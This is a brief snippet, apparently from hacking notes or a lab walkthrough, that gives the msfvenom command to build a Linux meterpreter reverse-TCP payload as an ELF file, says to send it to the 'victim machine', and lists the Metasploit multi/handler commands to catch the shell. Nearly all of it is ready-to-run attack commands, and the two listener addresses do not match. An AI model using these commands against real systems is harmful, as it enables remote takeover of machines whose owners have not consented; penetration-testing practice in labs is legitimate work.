msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=10.9.3.155 LPORT=9001 -f elf > pwned.elf

This created an .elf file you can use to send to the victim machine, than trigger a reverse shell from there to get a meterpreter shell. Allow me to elaborate: 

msfconsole
use multi/handler
set payload linux/x64/meterpreter_reverse_tcp
set LHOST 10.9.3.55
set LPORT 9001
run
